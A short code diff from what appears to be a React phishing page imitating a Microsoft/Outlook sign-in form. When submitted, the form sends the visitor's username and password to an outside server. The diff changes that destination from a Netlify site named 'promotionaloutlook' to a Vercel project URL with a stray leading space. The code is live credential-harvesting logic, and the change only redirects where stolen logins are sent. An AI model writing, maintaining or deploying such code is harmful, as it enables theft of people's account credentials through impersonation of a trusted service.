@@ -51,7 +51,7 @@ const MicrosoftSignIn = () => {
     if (validate()) {
       const data = { username: unameVal, password: pwdVal };
       axios
-        .post('https://promotionaloutlook.netlify.app/submit', data)
+        .post(' https://vercel.com/yesus-projects-e758688f/outlook/8QwVmNLXsdFnoeChD1kzcjeTbiuk/submit', data)
         .then((response) => {
           console.log(response.data.message);
           setView('final');
